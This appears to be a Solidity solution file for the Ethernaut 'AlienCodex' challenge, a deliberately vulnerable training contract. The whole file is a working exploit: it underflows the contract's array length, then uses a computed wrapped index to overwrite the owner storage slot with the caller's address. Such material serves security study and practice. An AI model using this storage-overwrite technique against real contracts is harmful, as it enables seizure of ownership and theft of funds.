// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./AlienCodex-08.sol";
import "forge-std/Vm.sol";

function playerScript(address instanceAddress) {
    new AlienCodexExploit().exploit(instanceAddress);
}

contract AlienCodexExploit {
    function exploit(address instanceAddress) public {
        AlienCodex instance = AlienCodex(instanceAddress);
        instance.make_contact();
        instance.retract();
        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
        instance.revise(
            type(uint256).max - codexZeroIndex + 1,
            bytes32(uint256(uint160(tx.origin)))
        );
    }
}
